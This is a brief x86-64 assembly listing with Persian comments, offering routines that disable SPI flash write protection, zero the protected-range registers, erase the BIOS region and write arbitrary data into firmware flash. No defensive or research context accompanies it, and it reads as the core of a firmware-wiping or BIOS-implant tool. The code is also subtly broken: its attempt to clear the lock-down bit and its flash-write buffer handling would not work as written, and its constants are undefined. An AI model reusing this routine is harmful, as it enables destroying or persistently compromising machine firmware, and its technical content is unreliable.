section .text

; باز کردن قفل SPI Flash
unlock_spi_flash:
    mov rax, SPI_CONTROLLER_BASE
    ; غیرفعال‌کردن حفاظت نوشتن
    mov dword [rax + SPI_HSFS], SPI_HSFS_FLOCKDN_CLEAR
    ; باز کردن قفل مناطق حفاظت شده
    mov dword [rax + SPI_FPR0], 0
    mov dword [rax + SPI_FPR1], 0
    mov dword [rax + SPI_FPR2], 0
    mov dword [rax + SPI_FPR3], 0
    mov dword [rax + SPI_FPR4], 0
    ; فعال‌سازی دسترسی
    mov dword [rax + SPI_HSFC], SPI_HSFC_FWRS
    ret

; پاک‌کردن منطقه BIOS
erase_bios_region:
    mov rax, SPI_CONTROLLER_BASE
    mov dword [rax + SPI_FADDR], SPI_BIOS_REGION
    mov dword [rax + SPI_FDATA0], 0
    mov dword [rax + SPI_HSFC], SPI_HSFC_FCYCLE_ERASE | SPI_HSFC_FGO
    call wait_spi_ready
    ret

; نوشتن داده به SPI Flash
write_spi_flash:
    ; rdi = آدرس داده، rsi = اندازه، rdx = آفست
    mov rax, SPI_CONTROLLER_BASE
    mov [rax + SPI_FADDR], rdx
    ; کپی داده به بافر
    mov rcx, rsi
    mov rsi, rdi
    mov rdi, [rax + SPI_FDATA0]
    rep movsb
    ; آغاز نوشتن
    mov dword [rax + SPI_HSFC], SPI_HSFC_FCYCLE_WRITE | SPI_HSFC_FGO
    call wait_spi_ready
    ret

wait_spi_ready:
    mov rax, SPI_CONTROLLER_BASE
.wait_loop:
    test dword [rax + SPI_HSFS], SPI_HSFS_FDONE
    jz .wait_loop
    ret
    